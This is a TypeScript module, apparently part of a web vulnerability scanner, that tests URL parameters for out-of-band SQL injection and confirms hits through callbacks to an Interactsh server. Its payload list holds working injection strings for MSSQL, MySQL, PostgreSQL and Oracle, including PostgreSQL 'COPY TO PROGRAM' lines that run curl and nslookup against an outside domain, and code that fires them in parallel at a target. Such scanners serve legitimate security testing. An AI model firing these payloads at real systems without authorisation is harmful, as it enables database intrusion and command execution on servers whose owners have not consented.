import { Job } from 'bullmq';
import { PrismaClient, Severity, VulnerabilityType } from '@prisma/client';
import { URL } from 'url';
import { v4 as uuidv4 } from 'uuid';
import * as crypto from 'crypto';
import axios from 'axios';
import { executeRequest, delay, recordVulnerability, COMMON_FALLBACK_PARAMS } from './common';

// ============================================================================
// ⚙️ CONFIGURATION
// ============================================================================

const INTERACTSH_SERVER = 'oast.pro';
const POLL_DELAY_MS = 5000; // تقليل وقت الانتظار قليلاً لأننا سنستخدم التوازي
const MAX_POLL_RETRIES = 2;

interface OobPayload {
    name: string;
    template: string;
}

const OOB_PAYLOADS: OobPayload[] = [
    { name: "MSSQL_DNS", template: `; EXEC master..xp_dirtree '\\\\{DOMAIN}\\a';--` },
    { name: "MySQL_DNS_Win", template: ` AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT version()), '.{DOMAIN}\\\\a')))` },
    { name: "PostgreSQL_HTTP", template: `'; COPY (SELECT '') TO PROGRAM 'curl http://{DOMAIN}';--` },
    { name: "PostgreSQL_DNS", template: `'; COPY (SELECT '' ) TO PROGRAM 'nslookup {DOMAIN}';--` },
    { name: "Oracle_HTTP", template: `'||UTL_HTTP.REQUEST('http://{DOMAIN}' )||'` },
    { name: "Oracle_DNS", template: `'||UTL_INADDR.GET_HOST_ADDRESS('{DOMAIN}')||'` },
];

// ============================================================================
// 🛡️ MAIN ATTACK LOGIC
// ============================================================================

export async function executeOutOfBandAttack(job: Job, prisma: PrismaClient): Promise<boolean> {
    const { targetUrl, scanId } = job.data;
    console.log('[Vector 3] 📡 Starting Out-of-Band (OOB) Attack...');
    
    let foundVulnerability = false;

    // 1. إعداد جلسة OAST واحدة لكل بارامتر (أو حتى للفحص كله لتقليل الضغط)
    // هنا سننشئ جلسة واحدة لكل بارامتر لسهولة التتبع
    for (const param of COMMON_FALLBACK_PARAMS) {
        console.log(`\n[Vector 3] 🎯 Testing Parameter: [${param}]`);

        try {
            // 2. تسجيل نطاق فريد (Unique Interaction Domain)
            const oastSession = await registerOastSession();
            if (!oastSession) {
                console.warn(`[Vector 3] ⚠️ Failed to register OAST session. Skipping param '${param}'.`);
                continue;
            }

            const { correlationId, secretKey, privateKey, uniqueDomain } = oastSession;
            console.log(`[Vector 3] Registered OAST Domain: ${uniqueDomain}`);

            // 3. إطلاق الحمولات بالتوازي (Fire & Forget)
            // نرسل كل أنواع الحمولات معاً، لأننا سنفحص الـ Interactions لاحقاً
            // كل حمولة ستحمل "بادئة" (Prefix) لتمييز نوع قاعدة البيانات
            const attackPromises = OOB_PAYLOADS.map(async (payloadConfig) => {
                // إضافة اسم البايلود للنطاق لتمييز الناجح منها
                // مثال: mssql.correlationId.oast.pro
                const taggedDomain = `${payloadConfig.name.substring(0, 5)}.${uniqueDomain}`;
                const finalPayload = payloadConfig.template.replace('{DOMAIN}', taggedDomain);
                
                const testUrl = new URL(targetUrl);
                testUrl.searchParams.set(param, finalPayload);

                // نرسل الطلب ولا ننتظر الرد (Fire and Forget) لأننا نهتم بـ DNS/HTTP Callback
                return executeRequest(testUrl.toString()).catch(() => {}); 
            });

            await Promise.all(attackPromises); // ننتظر إرسال جميع الطلبات

            // 4. الانتظار والتحقق (Poll for Interactions)
            console.log(`[Vector 3] ⏳ Polling for interactions (${POLL_DELAY_MS}ms)...`);
            await delay(POLL_DELAY_MS);

            const interactions = await pollOastInteractions(correlationId, secretKey, privateKey);

            if (interactions.length > 0) {
                console.log(`[Vector 3] ✅ OOB Interaction Detected! Count: ${interactions.length}`);
                
                // تحليل أول تفاعل ناجح
                const firstHit = interactions[0];
                // نحاول استخراج اسم البايلود من النطاق (full_id)
                const hitDomain = firstHit.full_id || firstHit.q_name || ""; 
                const detectedType = OOB_PAYLOADS.find(p => hitDomain.includes(p.name.substring(0, 5)))?.name || "Unknown";

                const proof = `Interaction Type: ${firstHit.protocol}\nPayload Type: ${detectedType}\nRemote IP: ${firstHit['remote-address']}\nFull Data: ${JSON.stringify(firstHit)}`;
                const description = `Out-of-Band SQLi confirmed in '${param}'. Server initiated a connection to ${uniqueDomain}.`;
                
                await recordVulnerability(prisma, scanId, VulnerabilityType.SQL_INJECTION, Severity.CRITICAL, description, proof);
                foundVulnerability = true;
                
                // لا داعي لإكمال البارامترات الأخرى إذا وجدنا ثغرة (اختياري)
                // break; 
            }

        } catch (error: any) {
            console.error(`[Vector 3] Error processing param '${param}': ${error.message}`);
        }
    }

    return foundVulnerability;
}

// ============================================================================
// 🛠️ OAST HELPER FUNCTIONS (Interactsh Client)
// ============================================================================

async function registerOastSession() {
    try {
        const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
            modulusLength: 2048,
            publicKeyEncoding: { type: 'pkcs1', format: 'pem' },
            privateKeyEncoding: { type: 'pkcs1', format: 'pem' },
        });
        const encodedPublicKey = Buffer.from(publicKey).toString('base64');
        const secretKey = uuidv4();
        const correlationId = uuidv4().substring(0, 20); // Interactsh requires max 20 chars

        const response = await axios.post(`https://${INTERACTSH_SERVER}/register`, {
            'public-key': encodedPublicKey,
            'secret-key': secretKey,
            'correlation-id': correlationId,
        }, { timeout: 5000 });

        if (response.status === 200) {
            return { 
                correlationId, 
                secretKey, 
                privateKey, 
                uniqueDomain: `${correlationId}.${INTERACTSH_SERVER}` 
            };
        }
    } catch (e) { /* ignore */ }
    return null;
}

async function pollOastInteractions(correlationId: string, secretKey: string, privateKey: string): Promise<any[]> {
    try {
        const response = await axios.get(
            `https://${INTERACTSH_SERVER}/poll?id=${correlationId}&secret=${secretKey}`, 
            { timeout: 5000 }
        );
        
        const { data, aes_key } = response.data;
        if (!data || !aes_key || data.length === 0) return [];

        // Decrypt AES Key
        const aesKeyBuffer = Buffer.from(aes_key, 'base64');
        const decryptedAesKey = crypto.privateDecrypt({
            key: privateKey,
            padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
            oaepHash: 'sha256',
        }, aesKeyBuffer);

        // Decrypt Interactions
        return data.map((entry: string) => {
            try {
                const encryptedBuffer = Buffer.from(entry, 'base64');
                const iv = encryptedBuffer.slice(0, 16);
                const content = encryptedBuffer.slice(16);
                
                const decipher = crypto.createDecipheriv('aes-256-cfb', decryptedAesKey, iv);
                const decrypted = Buffer.concat([decipher.update(content), decipher.final()]);
                
                return JSON.parse(decrypted.toString());
            } catch { return null; }
        }).filter((i: any) => i !== null);

    } catch (e) { return []; }
}